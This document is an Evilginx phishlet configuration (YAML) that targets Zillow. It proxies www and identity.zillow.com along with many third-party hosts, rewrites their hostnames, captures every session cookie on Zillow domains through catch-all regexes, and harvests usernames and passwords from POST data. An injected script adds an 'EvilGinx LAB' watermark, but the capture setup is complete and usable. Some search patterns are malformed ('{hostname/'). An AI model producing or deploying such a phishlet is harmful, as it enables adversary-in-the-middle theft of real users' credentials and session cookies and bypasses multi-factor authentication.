
author: '@EvilWhales'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'zillow.com', session: true, is_landing: true, auto_filter: false}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'pubnub.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'zillowstatic.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'google-analytics.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'zg-api.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'datadoghq-browser-agent.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'pagead2', orig_sub: 'pagead2', domain: 'googlesyndication.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'o168728.ingest', orig_sub: 'o168728.ingest', domain: 'sentry.io', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'sb', orig_sub: 'sb', domain: 'scorecardresearch.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'tzm', orig_sub: 'tzm', domain: 'px-cloud.net', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'collector-pxhyx10rg3', orig_sub: 'collector-pxhyx10rg3', domain: 'px-cloud.net', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'e', orig_sub: 'e', domain: 'zg-api.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'rum', orig_sub: 'rum', domain: 'zg-api.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'cookielaw.org', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'geolocation', orig_sub: 'geolocation', domain: 'onetrust.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 's', orig_sub: 's', domain: 'pinimg.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'js', orig_sub: 'js', domain: 'adsrvr.org', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: '', orig_sub: '', domain: 'tk0x1.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'lighthouse', orig_sub: 'lighthouse', domain: 'edoinc.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'clarity.ms', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'insight', orig_sub: 'insight', domain: 'adsrvr.org', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'identity', orig_sub: 'identity', domain: 'zillow.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'auth0.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 's', orig_sub: 's', domain: 'zillow.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'cs', orig_sub: 'cs', domain: 'zg-api.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'delivery.digitalassets', orig_sub: 'delivery.digitalassets', domain: 'zillowgroup.com', session: true, is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: 'identity.zillow.com', orig_sub: 'cdn', domain: 'pubnub.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'www', domain: 'zillowstatic.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'www', domain: 'google-analytics.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'cdn', domain: 'zg-api.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'www', domain: 'datadoghq-browser-agent.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'pagead2', domain: 'googlesyndication.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'o168728.ingest', domain: 'sentry.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'sb', domain: 'scorecardresearch.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'tzm', domain: 'px-cloud.net', search: 'https://{hostname/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'collector-pxhyx10rg3', domain: 'px-cloud.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'e', domain: 'zg-api.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'rum', domain: 'zg-api.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'cdn', domain: 'cookielaw.org', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'geolocation', domain: 'onetrust.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 's', domain: 'pinimg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'js', domain: 'adsrvr.org', search: 'https://{hostname/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: '', domain: 'tk0x1.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'lighthouse', domain: 'edoinc.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'www', domain: 'clarity.ms', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'insight', domain: 'adsrvr.org', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}

  - {triggers_on: 'identity.zillow.com', orig_sub: 'identity', domain: 'zillow.com', search: 'https://{hostname/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'cdn', domain: 'auth0.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 's', domain: 'zillow.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'cs', domain: 'zg-api.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'delivery.digitalassets', domain: 'zillowgroup.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'identity.zillow.com', orig_sub: 'www', domain: 'zillow.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}
  - {triggers_on: 'www.zillow.com', orig_sub: 'www', domain: 'zillow.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['application/ld+json', 'text/html', 'text/plain', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xml', 'application/speculationrules+json']}

auth_tokens:
  - domain: '.zillow.com'
    keys: ['[^"]+,regexp']
    type: 'cookie'
  - domain: 'www.zillow.com'
    keys: ['[^"]+,regexp']
    type: 'cookie'
  - domain: 'www.clarity.ms'
    keys: ['[^"]+,regexp']
    type: 'cookie'
  - domain: '.scorecardresearch.com'
    keys: ['[^"]+,regexp']
    type: 'cookie'
  - domain: '.zg-api.com'
    keys: ['[^"]+,regexp']
    type: 'cookie'

auth_urls:
  - '/'

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'www.zillow.com'
  path: '/'

js_inject:
  - trigger_domains: ['www.zillow.com']
    trigger_paths: ['.*']
    script: |
      console.log('js_inject: Script loaded on', window.location.href, 'at', new Date().toISOString());

      function createWatermark() {
        const create = () => {
          if (document.body) {
            const watermarkContainer = document.createElement('div');
            watermarkContainer.className = 'watermark-container';
            watermarkContainer.style.cssText = `
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              z-index: 99999;
              pointer-events: none;
              overflow: hidden;
              background: transparent;
            `;

            const text = 'EvilGinx LAB by INJECT';
            for (let y = -100; y < window.innerHeight + 100; y += 150) {
              for (let x = -100; x < window.innerWidth + 100; x += 300) {
                const watermark = document.createElement('div');
                watermark.style.cssText = `
                  position: absolute;
                  left: ${x}px;
                  top: ${y}px;
                  color: #333333;
                  font-family: Arial, sans-serif;
                  font-size: 24px;
                  opacity: 0.2;
                  transform: rotate(-45deg);
                  white-space: nowrap;
                  user-select: none;
                `;
                watermark.textContent = text;
                watermarkContainer.appendChild(watermark);
              }
            }
            document.body.appendChild(watermarkContainer);
            console.log('js_inject: Watermark added, container:', document.querySelector('.watermark-container') ? 'present' : 'missing');
            return true;
          }
          console.log('js_inject: Document body not ready, retrying watermark creation');
          return false;
        };

        requestAnimationFrame(() => {
          if (!create()) {
            const interval = setInterval(() => {
              if (create()) {
                clearInterval(interval);
              }
            }, 500);
          }
        });
      }

      console.log('js_inject: Initializing at', new Date().toISOString());
      createWatermark();